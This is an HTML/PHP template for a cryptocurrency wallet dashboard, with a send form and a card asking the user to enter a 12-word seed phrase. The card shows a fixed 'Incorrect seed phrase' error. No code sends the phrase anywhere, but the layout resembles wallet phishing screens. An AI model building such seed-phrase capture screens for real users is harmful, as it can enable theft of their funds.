<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CryptoWallet</title>
    <link rel="icon" href="data:image/x-icon;base64," type="image/x-icon" />
    <link crossorigin href="https://fonts.gstatic.com/" rel="preconnect" />
    <link as="style" rel="stylesheet" onload="this.rel='stylesheet'"
        href="https://fonts.googleapis.com/css2?display=swap&family=Manrope:wght@400;500;700;800&family=Noto+Sans:wght@400;500;700;900" />
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
    <!-- <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script> -->
    <script src="assets/js/tailwindcss.js"></script>
    <style type="text/tailwindcss">
        :root {
      --primary-color: #53d22c;
      --background-color: #121212;
      --text-primary: #E0E0E0;
      --text-secondary: #A0A0A0;
      --accent-color: #66bb6a;
      --surface-color: #1E1E1E;
      --on-surface-color: #2D2D2D;
      --border-color: #333333;
    }
    body {
            font-family: 'Manrope', sans-serif;
            background-color: var(--background-color);
            color: var(--text-primary);
        }
    .input {
            @apply w-full bg-[var(--on-surface-color)] text-[var(--text-primary)] border border-[var(--border-color)] rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[var(--primary-color)] transition-shadow;
        }
    .card {
      @apply bg-[var(--surface-color)] rounded-2xl p-4 sm:p-6 shadow-lg;
    }
    .button_primary {
            @apply w-full bg-[var(--primary-color)] text-black rounded-full px-6 py-3 text-base font-bold hover:bg-[var(--accent-color)] transition-colors disabled:opacity-50 disabled:cursor-not-allowed;
        }
    .button_secondary {
            @apply bg-[var(--on-surface-color)] text-[var(--text-primary)] rounded-full px-4 py-2 hover:bg-[#383838] transition-colors;
        }
    .sidebar-mobile {
      transform: translateX(-100%);
    }
    .sidebar-mobile.open {
      transform: translateX(0);
    }
    @media (min-width: 768px) {
      .sidebar-mobile {
        transform: translateX(0);
      }
    }
  </style>
</head>

<body class="bg-[var(--background-color)] text-[var(--text-primary)] overflow-x-hidden">
    <div class="flex min-h-screen">
        <?php include "components/sidebar.php"; ?>

        <!-- Main Content -->
        <div class="flex-1 flex flex-col min-w-0">
            <!-- Mobile Top Bar -->
            <?php include "components/header.php"; ?>

            <!-- Main Dashboard -->
            <main class="flex-1 p-4 sm:p-6 lg:p-8">
                <div
                    class="w-full max-w-lg mb-6 mx-auto bg-[var(--surface-color)] rounded-2xl shadow-2xl p-8 space-y-6">
                    <div class="text-center">
                        <h2 class="text-3xl font-bold text-white">Update Profile</h2>
                        <p class="text-[var(--text-secondary)] mt-2">Securely send cryptocurrency to any address.</p>
                    </div>
                    <form class="space-y-6">
                        <div>
                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                                for="coin-select">Select Coin</label>
                            <div class="relative">
                                <select class="input appearance-none" id="coin-select">
                                    <option>Bitcoin (BTC)</option>
                                    <option>Ethereum (ETH)</option>
                                    <option>Litecoin (LTC)</option>
                                </select>
                                <span
                                    class="material-icons absolute right-3 top-1/2 -translate-y-1/2 text-[var(--text-secondary)] pointer-events-none">expand_more</span>
                            </div>
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                                for="recipient-address">Recipient Address</label>
                            <div class="relative">
                                <input class="input pr-12" id="recipient-address" placeholder="Enter address"
                                    type="text" />
                                <button
                                    class="absolute right-2 top-1/2 -translate-y-1/2 button_secondary p-1.5 rounded-md"
                                    type="button">
                                    <span class="material-icons text-lg">qr_code_scanner</span>
                                </button>
                            </div>
                        </div>
                        <div>
                            <div class="flex justify-between items-baseline">
                                <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                                    for="amount">Amount</label>
                                <span class="text-xs text-[var(--text-secondary)]">Available: 0.12345 BTC</span>
                            </div>
                            <div class="relative">
                                <input class="input" id="amount" placeholder="0.00" type="number" />
                                <span
                                    class="absolute right-4 top-1/2 -translate-y-1/2 text-[var(--text-secondary)] font-semibold">BTC</span>
                            </div>
                        </div>
                        <!-- <div
                            class="text-sm text-[var(--text-secondary)] border-t border-[var(--border-color)] pt-4 space-y-2">
                            <div class="flex justify-between">
                                <span>Network Fee:</span>
                                <span class="text-white font-medium">~ 0.00012 BTC</span>
                            </div>
                            <div class="flex justify-between">
                                <span>Total:</span>
                                <span class="text-white font-medium">0.00000 BTC</span>
                            </div>
                        </div> -->
                        <div>
                            <button class="button_primary" type="submit">
                                Review Transaction
                            </button>
                        </div>
                    </form>
                </div>

                <!-- phrase -->
                <div class="card w-full max-w-lg mx-auto">
                    <div class="text-center">
                        <h1 class="typography_h1 mb-2">Enter Your Seed Phrase</h1>
                        <p class="typography_body">Enter your 12-word seed phrase to recover your wallet.</p>
                    </div>
                    <div class="mt-8">
                        <textarea
                            class="input w-full min-h-36 resize-none p-4 text-base leading-normal bg-white/5 border-white/10 focus:border-[var(--primary-color)] focus:ring-0"
                            placeholder="Enter your 12-word seed phrase"></textarea>
                        <p class="typography_body mt-2 text-center text-red-500">Incorrect seed phrase. Please try
                            again.</p>
                    </div>
                    <div class="mt-6 flex justify-center">
                        <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider">
                            <span>Recover Wallet</span>
                        </button>
                    </div>
                </div>
            </main>
        </div>
    </div>

</body>

</html>